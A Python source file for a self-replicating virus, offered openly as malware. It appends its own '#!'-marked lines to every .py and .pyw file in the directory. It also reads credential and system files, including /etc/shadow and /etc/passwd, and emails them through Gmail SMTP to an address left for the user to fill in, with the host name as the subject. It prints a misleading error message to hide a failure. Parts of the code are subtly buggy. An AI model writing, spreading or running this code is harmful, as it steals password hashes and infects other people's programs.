import glob #!
from string import * #!
import smtplib #!
from email.MIMEMultipart import MIMEMultipart #!
from email.MIMEText import MIMEText #!
import socket #!

def copy(): #!
	Files = glob.glob("*.py") + glob.glob("*.pyw") #!
	for Files in Files: #!
		vCode = open(__file__,"r") #!
		victim = open(Files,"r") #!
		readvictim = victim.read() #!
		if find(readvictim, "-=::CHANGE::=-") == -1: #!
			victim = open(Files, "a") #!
			for code in vCode.readlines(): #!
				if ("#!") in code: #!
					vCode.close() #!
					mycode =(code) #!
					victim.write(mycode)#!s

def gather(): #!
	Files =  ["/etc/passwd","/etc/hosts","/etc/shadow","/etc/hosts.allow","C:\Windows\Logs\DISM\dism.log"] #!
	data = "" #!
	for i in Files: #!
		try: #!
			File = open(i,"r") #!
			data += i + "\n" + ("#" *10) + "\n" #!
			for line in File.readlines(): #!
				data += line #!
		except: #!
			data += i + "\n#COULDNOTBEFOUND#\n" #!
		data + "\n"
	return data #!

def send(data): #!
	# THESE MUST BE CUSTOMIZED
	fromaddr = "YOURGMAIL@GMAIL.com" #! 
	toaddr = "RecvingEmail@example.com" #!
	username = "YOURUSERNAME"  #! 
	password = "NOTMYPASSWORD" #!
	msg = MIMEMultipart() #!
	msg["From"] = fromaddr #!
	msg["To"] = toaddr #!
	msg["Subject"] = socket.gethostname() #!
	msg.attach(MIMEText(data)) #!
	server = smtplib.SMTP("smtp.gmail.com:587")
	server.ehlo() #!
	server.starttls() #!
	server.ehlo() #!
	server.login(username,password) #!
	server.sendmail(fromaddr, toaddr, msg.as_string()) #!
	server.quit() #!

def main(): #!
	try: #!
		send(gather()) #!
	except:
		print("[-]RAM LOADING FAILED")
	copy() #!

main() #!